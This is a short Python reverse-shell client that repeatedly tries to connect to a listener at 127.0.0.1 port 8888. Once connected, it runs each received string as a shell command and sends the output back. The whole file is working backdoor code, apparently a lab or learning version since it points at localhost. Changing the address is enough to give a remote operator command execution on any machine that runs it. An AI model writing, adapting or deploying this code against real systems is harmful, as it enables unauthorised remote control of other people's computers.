#!/usr/bin/python3

import socket 
import subprocess

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print("Connecting")
while True:
	try:
		s.connect(("127.0.0.1",8888))
		break
	except ConnectionRefusedError:
		pass
print("Connected !")

while True:
	cmd  = (s.recv(1024)).decode()
	if cmd == "exit" or cmd == "q":
		break
	out = subprocess.getoutput(cmd)
	s.send(out.encode())

s.close()
print("Connection closed by the remote host!")